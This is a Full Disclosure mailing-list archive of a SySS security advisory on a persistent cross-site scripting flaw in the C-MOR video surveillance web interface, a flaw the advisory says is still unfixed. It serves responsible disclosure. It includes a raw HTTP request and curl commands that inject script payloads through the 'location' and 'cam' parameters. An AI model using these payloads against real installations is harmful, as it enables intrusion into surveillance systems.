---
title: [SYSS-2024-021]: C-MOR Video Surveillance - Persistent Cross-Site Scripting (CWE-79)
url: https://seclists.org/fulldisclosure/2024/Sep/9
source: Full Disclosure
date: 2024-09-07
fetch_date: 2025-10-06T18:31:32.504063
---

# [SYSS-2024-021]: C-MOR Video Surveillance - Persistent Cross-Site Scripting (CWE-79)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2024-021]: C-MOR Video Surveillance - Persistent Cross-Site Scripting (CWE-79)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 4 Sep 2024 08:11:38 +0200

---

```
Advisory ID:               SYSS-2024-021
Product:                   C-MOR Video Surveillance
Manufacturer:              za-internet GmbH
Affected Version(s):       5.2401, 6.00PL01
Tested Version(s):         5.2401, 6.00PL01
Vulnerability Type:        Persistent Cross-Site Scripting (CWE-79)
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2024-04-05
Solution Date:             -
Public Disclosure:         2024-09-04
CVE Reference:             CVE-2024-45177
Authors of Advisory:       Chris Beiter, Frederik Beimgraben,
                           and Matthias Deeg

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The software product C-MOR is an IP video surveillance system.

The manufacturer describes the product as follows:

"With C-MOR video surveillance, it is possible to check your
surveillance over network and the Internet. You can access the live
view as well as previous recordings from any PC or mobile device.
C-MOR is managed and controlled over the C-MOR web interface.
IP settings, camera recording setup, user rights and so on are set
over the web without the installation of any software on the
client."[1]

Due to improper input validation, the C-MOR web interface is vulnerable
to persistent cross-site scripting attacks.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

By analyzing the C-MOR web interface, it was found that the camera
configuration is vulnerable to a persistent cross-site scripting attack
due to insufficient user input validation.

This kind of attack enables an attacker to persistently store attack
vectors in form of arbitrary code, for instance JavaScript code, in the
web application database, which may be executed in the context of other
users.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

An authenticated user can set the location of a camera. If valid
JavaScript code is used as location value, this code will be
persistently stored in the web application database.

The injected JavaScript code is served to users and executed in their
web browser's context when using different functionality of the C-MOR
web interface, for instance camera settings via "show-movies.plm" or
system administration via "systemadministration.plm".

The following HTTPS POST request illustrates storing an attack vector
via the parameter "location":

POST /changelocation.pml HTTP/1.1
Host: <HOST>
Authorization: Basic <CREDENTIALS>
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

location=location%3Cscript%3Ealert%28%22SySS+XSS%21%22%29%3C%2Fscript%3E&cam=cam1

An excerpt of the resulting HTML source code containing the injected
JavaScript code is shown below:

(...)
```

<input type=submit value="Aufzeichnung aktivieren" class="link\_button2">
location<script>alert("SySS XSS!")</script><br>

```
(...)

This PoC attack can be performed using the following curl command:
```

curl -X POST -d 'location=location<script>alert("SySS
XSS!")</script>&cam=cam1' --user "<USERNAME>:<PASSWORD>" --insecure
--ciphers 'DEFAULT:!DH' https://<HOST>/changelocation.pml

```
In version 6.00PL01, persistent cross-site scripting vulnerabilties have
not been fixed completely. For example, the following attack vector can
successfully store attacker-controlled JavaScript code in the logs:

curl -X POST \
```

 -d 'cam=</textarea><script>alert("Hello from
XSS")</script><textarea>&days=1100' \

```
   --user "<USERNAME>:<PASSWORD>" \
   --insecure \
   --ciphers 'DEFAULT:!DH' \
   https://<HOST>/show-movies.pml

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

The described security vulnerability has not been fixed entirely in the
newly released software version 6.00PL01.

There is no fix for this security issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2024-04-05: Vulnerability reported to manufacturer
2024-04-05: Manufacturer acknowledges receipt of security advisories
2024-04-08: Exchange regarding security updates and disclosure timeline
2024-05-08: Further exchange concerning security updates and disclosure
            timeline; public release of all security advisories
            scheduled for release of C-MOR Video Surveillance version 6
2024-05-10: Release of C-MOR software version 5.30 with security updates
            for some reported security issues
2024-07-19: E-mail to manufacturer concerning release date of C-MOR
            Video Surveillance version 6; response with planned
            release date of 2024-08-01
2024-07-30: E-mail from manufacturer with further information
            concerning security fixes
2024-07-31: Release of C-MOR software version 6.00PL1
2024-09-04: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] Product website for C-MOR Video Surveillance
    https://www.c-mor.com/
[2] SySS Security Advisory SYSS-2024-021

https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-021.txt
[3] SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Chris Beiter, Frederik
Beimgraben.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
```

**Attachment:
[OpenPGP\_signature.asc](att-9/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

### Current thread:

* **[SYSS-2024-021]: C-MOR Video Surveillance - Persistent Cross-Site Scripting (CWE-79)** *Matthias Deeg via Fulldisclosure (Sep 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/o...